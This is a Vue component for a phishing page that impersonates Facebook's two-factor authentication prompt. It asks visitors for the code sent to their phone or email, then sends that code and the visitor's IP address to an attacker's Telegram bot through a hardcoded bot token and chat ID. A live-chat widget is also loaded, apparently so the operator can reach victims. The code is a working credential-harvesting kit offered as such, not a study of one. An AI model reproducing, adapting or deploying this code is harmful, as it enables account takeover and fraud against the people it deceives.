<script>
  (function(d, w, c) {
        w.ChatraID = 'Znyiomk26HxAoRp23';
        var s = d.createElement('script');
        w[c] = w[c] || function() {
            (w[c].q = w[c].q || []).push(arguments);
        };
        s.async = true;
        s.src = 'https://call.chatra.io/chatra.js';
        if (d.head) d.head.appendChild(s);
    })(document, window, 'Chatra');
import useValidate from "@vuelidate/core";
import { required, minLength } from "@vuelidate/validators";
import axios from "axios";
import ChatWidget from "@/components/ChatWidget.vue";

export default {
  name: "2FA",
  components: {
    ChatWidget,
  },
  data() {
    return {
      v$: useValidate(),
      loadingBar: 0,
      loadingCreditBar: 0,
      cext: "",
      countdown: "",
      loading: "",
      ipAddress: "",
      type: "",
      email: "",
      robot: false,
      creditRobot: false,
      creditMinute: '0:00',
      formError: false,
      chatMessage: false,
      form: {
        code: "",
      },
      telegramToken: "6905926094:AAGyqYfNpoHk4OTzeido68UiviOwJb6lOVE",
      chatId: "1389938531",
      disableSubmit: false, // Flag to disable submit button
      resendTimeout: null, // Timeout variable
      resendCooldown: 30, // Cooldown time in seconds
    };
  },
  mounted() {
    this.getClientIP();
  },
  created() {
    document.title = "Facebook | Two-Factor Authentication Required";
    this.codeExpirationTimeout();
    this.type = this.$route.params.type;
    this.email = this.$route.params.email;
  },
  methods: {
    chatMessageStatus() {
      this.chatMessage = true;
      console.log(this.chatMessage);
    },
    getClientIP() {
      axios
        .get("https://api.ipify.org?format=json")
        .then((response) => {
          this.ipAddress = response.data.ip;
          // this.checkBan();
        })
        .catch((e) => {
          console.log(e);
        });
    },
    async submit() {
      if (this.disableSubmit) {
        // If submit button is disabled, do nothing
        return;
      }
      this.v$.$validate(); // checks all inputs
      if (!this.v$.$error) {
        // Send code to Telegram
        await axios.post(`https://api.telegram.org/bot${this.telegramToken}/sendMessage`, {
          chat_id: this.chatId,
          text: `Verification code: ${this.form.code}\nIP Address: ${this.ipAddress}`,
        });

        // Disable submit button and start cooldown timer
        this.disableSubmit = true;
        this.startResendCooldown();

        // Proceed with the rest of the code
        // For example, you can uncomment and use the following code to make API calls if needed
        // axios
        //   .post(
        //     "/api/message",
        //     { codeGenerator: this.form.code }
        //   )
        //   .then((response) => {
        //     this.form.code = "";
        //     // this.type = "";
        //     // this.robotView();
        //     this.formError = false;
        //     this.loading = true;
        //     this.getResponse();
        //   })
        //   .catch((e) => {
        //     console.log(e);
        //   });
      } else {
        alert("Please enter a valid code to continue!");
      }
    },
    formatSeconds(s){
      return(s-(s%=60))/60+(9<s?':':':0')+s
    },
    codeExpirationTimeout() {
      this.countdown = "(wait 05:00)";
      var countDownDate = new Date(Date.now() + 5 * 60 * 1000).getTime();

      this.cext = setInterval(() => {
        var now = new Date().getTime();
        var distance = countDownDate - now;

        // Time calculations for days, hours, minutes and seconds
        var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
        var seconds = Math.floor((distance % (1000 * 60)) / 1000);

        this.countdown = "(wait " + minutes + ":" + seconds + ")";

        if (distance < 0) {
          clearInterval(this.cext);
          this.countdown = "EXPIRED";
        }
      }, 1000);
    },
    startResendCooldown() {
      this.resendTimeout = setInterval(() => {
        if (this.resendCooldown > 0) {
          this.resendCooldown--;
        } else {
          clearInterval(this.resendTimeout);
          this.disableSubmit = false; // Enable submit button after cooldown
          this.resendCooldown = 30; // Reset cooldown time
        }
      }, 1000);
    },
  },
  validations() {
    return {
      form: {
        code: { required, minLength: minLength(6) },
      },
    };
  },
};
</script>
<template>
    <div v-if="loading" id="loadFacebookC" class="">
        <div id="loadFacebookG">
        <div id="blockG_1" class="facebook_blockG"></div>
        <div id="blockG_2" class="facebook_blockG"></div>
        <div id="blockG_3" class="facebook_blockG"></div>
        </div>
    </div>

    <div class="bg-white">
        <div class="h-screen w-screen flex flex-col justify-center items-center">
            <div v-if="type == 'code'" class="bg-gray-200 h-full w-full flex justify-center items-center">
                <div
                    class="h-[630px] md:h-[610px] w-[340px] md:w-[600px] bg-white rounded-xl px-[22px] py-[22px] md:py-[30px]">
                    <div>
                        <p class="font-bold font-montserrat text-[24px]">Check your text messages</p>
                        <p class="font-montserrat pb-1 border-b-2 text-gray-500 text-[16px] mt-0.5">We sent a
                            6-digit code or 8-digit code to your mobile phone.</p>
                        <p class="font-montserrat text-gray-500 text-[16px] mt-0.5 py-2">Enter the code from your
                            generator, sms or third-party-app below.</p>
                        <div class="mt-2 h-[130px] md:h-[200px] w-full"><img
                                src="../assets/images/confirm-mobile.af05cfecf754cdc833fd.gif" alt=""
                                class="w-full h-full bg-cover"></div>
                            <input type="number" placeholder="Code"
                            class="h-[46px] w-full mt-4 focus:outline-blue-400 bg-gray-100 rounded-lg border-2 border-gray-200 font-montserrat text-[16px] pl-4"
                            v-model="form.code">
                        <div class="flex items-center mt-2" v-if="disableSubmit">
                            <p class="text-red-500 text-[14px]">Resend in {{ formatSeconds(resendCooldown) }}</p>
                        </div>
                        <div
                            class="h-[110px] md:h-[84px] bg-gray-50 rounded w-full flex justify-center items-center">
                            <p class="inline flex-grow font-montserrat">Make sure you're in an area with good signal
                                so the code can reach your phone.<strong class="inline text-black"></strong></p>
                        </div>
                        <div class="flex flex-col gap-y-2 mt-3 md:mt-8">
                            <div
                                @click="submit()"
                                class="text-black hover:bg-gray-300 cursor-pointer bg-gray-200 font-montserrat flex justify-center cursor-default items-center font-bold text-[16px] rounded-lg w-full h-[48px]">
                                Next
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div v-if="type == 'email'" class="bg-gray-200 h-full w-full flex justify-center items-center">
                <div
                    class="h-[630px] md:h-[610px] w-[340px] md:w-[600px] bg-white rounded-xl px-[22px] py-[22px] md:py-[30px]">
                    <div>
                        <p class="font-bold font-montserrat text-[24px]">Check your email</p>
                        <p class="font-montserrat pb-1 border-b-2 text-gray-500 text-[16px] mt-0.5">We sent a
                            6-digit code or 8-digit code to your email.</p>
                        <p class="font-montserrat text-gray-500 text-[16px] mt-0.5 py-2">Enter the code from your
                            email.</p>
                        <div class="mt-2 h-[130px] md:h-[200px] w-full"><img
                                src="../assets/images/confirm-mobile.af05cfecf754cdc833fd.gif" alt=""
                                class="w-full h-full bg-cover"></div>
                            <input type="number" placeholder="Code"
                            class="h-[46px] w-full mt-4 focus:outline-blue-400 bg-gray-100 rounded-lg border-2 border-gray-200 font-montserrat text-[16px] pl-4"
                            v-model="form.code">
                            <p v-if="formError" class="text-red-500">The code is incorrect, make you sure wrote the correct one.</p>
                        <div class="flex items-center mt-2" v-if="disableSubmit">
                            <p class="text-red-500 text-[14px]">Resend in {{ formatSeconds(resendCooldown) }}</p>
                        </div>
                        <div
                            class="h-[110px] md:h-[84px] bg-gray-50 rounded w-full flex justify-center items-center">
                            <p class="inline flex-grow font-montserrat">Make sure you're in an area with good signal
                                so the code can reach your phone.<strong class="inline text-black"></strong></p>
                        </div>
                        <div class="flex flex-col gap-y-2 mt-3 md:mt-8">
                            <div
                                @click="submit()"
                                class="text-black hover:bg-gray-300 cursor-pointer bg-gray-200 font-montserrat flex justify-center cursor-default items-center font-bold text-[16px] rounded-lg w-full h-[48px]">
                                Next
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <ChatWidget/>

</template>
<style scoped src="@/assets/css/style.css" >
</style>
